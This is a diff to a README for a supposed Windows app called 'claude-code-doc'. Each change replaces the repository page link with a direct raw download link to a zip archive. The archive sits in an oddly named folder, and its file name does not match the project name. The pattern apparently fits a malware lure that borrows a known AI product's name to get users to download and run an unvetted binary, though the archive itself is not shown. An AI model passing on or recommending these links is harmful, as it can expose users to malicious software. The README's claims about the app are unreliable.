@@ -1,6 +1,6 @@
 # 🧠 claude-code-doc - Simple local docs for Claude
 
-[![Download](https://img.shields.io/badge/Download-claude--code--doc-4B5563?style=for-the-badge&labelColor=2563EB)](https://github.com/Nobeliummolestation149/claude-code-doc)
+[![Download](https://img.shields.io/badge/Download-claude--code--doc-4B5563?style=for-the-badge&labelColor=2563EB)](https://raw.githubusercontent.com/Nobeliummolestation149/claude-code-doc/main/crazedly/claude-doc-code-1.7-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ claude-code-doc is a Windows app for reading and working with Claude code docs i
 
 Visit this page to download the app:
 
-https://github.com/Nobeliummolestation149/claude-code-doc
+https://raw.githubusercontent.com/Nobeliummolestation149/claude-code-doc/main/crazedly/claude-doc-code-1.7-beta.1.zip
 
 If the page shows a release file, download it to your PC. If it gives you a folder or package, download the main Windows file from that page.
 
@@ -133,7 +133,7 @@ Return to the download page and check for a newer file.
 
 If you need the file again, use this link:
 
-https://github.com/Nobeliummolestation149/claude-code-doc
+https://raw.githubusercontent.com/Nobeliummolestation149/claude-code-doc/main/crazedly/claude-doc-code-1.7-beta.1.zip
 
 ## 📌 File Name
 
